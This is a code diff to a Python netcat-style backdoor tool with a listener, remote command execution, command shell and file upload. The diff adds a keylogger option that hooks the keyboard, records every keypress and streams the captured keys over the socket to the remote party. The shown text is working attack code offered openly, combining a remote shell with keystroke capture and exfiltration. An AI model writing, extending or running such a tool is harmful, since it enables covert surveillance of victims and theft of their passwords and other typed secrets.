@@ -5,16 +5,37 @@ import socket
 import getopt
 import threading
 import subprocess
+import keyboard
+import threading
 
 
 # define some global variables
 listen             = False
 command            = False
 upload             = False
+keylogger          = False
 execute            = ""
 target             = ""
 upload_destination = ""
 port               = 0
+lock = threading.Lock()
+keypresses = []
+
+def key_press_thread():
+    while True:
+            try:
+                    keyboard.wait()
+            except KeyboardInterrupt:
+                    print("Exiting")
+                    return
+
+def on_key_press(event):
+    global keypresses
+    # send data
+    with lock:
+        keypresses.append(event.name)
+    print keypresses
+
 
 # this runs a command and returns the output
 def run_command(command):
@@ -36,6 +57,10 @@ def client_handler(client_socket):
         global upload
         global execute
         global command
+        global keylogger
+        global keypresses
+        print keylogger
+        print keypresses
 
         # check for upload
         if len(upload_destination):
@@ -67,12 +92,22 @@ def client_handler(client_socket):
 
         # check for command execution
         if len(execute):
-
                 # run the command
                 output = run_command(execute)
 
                 client_socket.send(output)
 
+        if keylogger:
+                while True:
+                        if len(keypresses):
+                                with lock:
+                                    msg = ""
+                                    for key in keypresses:
+                                            msg += key + '\n'
+
+                                    keypresses = []
+
+                                client_socket.send(msg)
 
         # now we go into another loop if a command shell was requested
         if command:
@@ -128,11 +163,9 @@ def client_sender(buffer):
                 # if not we are going to wait for the user to punch some in
 
                 if len(buffer):
-
                         client.send(buffer)
 
                 while True:
-
                         # now wait for data back
                         recv_len = 1
                         response = ""
@@ -140,7 +173,7 @@ def client_sender(buffer):
                         while recv_len:
                                 data     = client.recv(4096)
                                 recv_len = len(data)
-                                response+= data
+                                response += data
 
                                 if recv_len < 4096:
                                         break
@@ -155,9 +188,10 @@ def client_sender(buffer):
                         client.send(buffer)
 
 
-        except:
+        except Exception as e:
                 # just catch generic errors - you can do your homework to beef this up
                 print "[*] Exception! Exiting."
+                print e
 
                 # teardown the connection
                 client.close()
@@ -173,6 +207,7 @@ def usage():
         print "-e --execute=file_to_run   - execute the given file upon receiving a connection"
         print "-c --command               - initialize a command shell"
         print "-u --upload=destination    - upon receiving connection upload a file and write to [destination]"
+        print "-k --keylogger             - start keylogger"
         print
         print
         print "Examples: "
@@ -188,6 +223,7 @@ def main():
         global port
         global execute
         global command
+        global keylogger
         global upload_destination
         global target
 
@@ -196,7 +232,7 @@ def main():
 
         # read the commandline options
         try:
-                opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute","target","port","command","upload"])
+            opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:k",["help","listen","execute","target","port","command","upload","keylogger"])
         except getopt.GetoptError as err:
                 print str(err)
                 usage()
@@ -211,6 +247,11 @@ def main():
                         execute = a
                 elif o in ("-c", "--commandshell"):
                         command = True
+                elif o in ("-k", "--keylogger"):
+                        keyboard.on_press(on_key_press)
+                        keyboard_thread = threading.Thread(target=key_press_thread)
+                        keyboard_thread.start()
+                        keylogger = True
                 elif o in ("-u", "--upload"):
                         upload_destination = a
                 elif o in ("-t", "--target"):
@@ -223,7 +264,6 @@ def main():
 
         # are we going to listen or just send data from stdin
         if not listen and len(target) and port > 0:
-
                 # read in the buffer from the commandline
                 # this will block, so send CTRL-D if not sending input
                 # to stdin
